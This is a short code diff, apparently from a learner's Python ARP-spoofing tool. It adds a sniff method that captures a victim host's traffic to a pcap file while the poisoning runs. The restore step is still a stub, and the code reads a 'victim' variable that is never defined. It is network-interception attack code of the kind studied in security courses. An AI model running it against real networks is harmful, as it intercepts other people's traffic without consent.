@@ -77,8 +77,17 @@ class Arper:
             else:
                 time.sleep(2)
 
-    def sniff(self, count = 200):
-        pass
+    def sniff(self, count = 100):
+        time.sleep(5)
+        print(f'Capturando {count} pacptes')
+        bpf_filter = "ip host %s" % victim
+        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
+        wrpcap('arper.pacap', packets)
+        print('Pacotes recebidos')
+        self.restore()
+        self.poison_thread.terminate()
+        print('Concluído')
+        
 
     def restore(self):
         pass
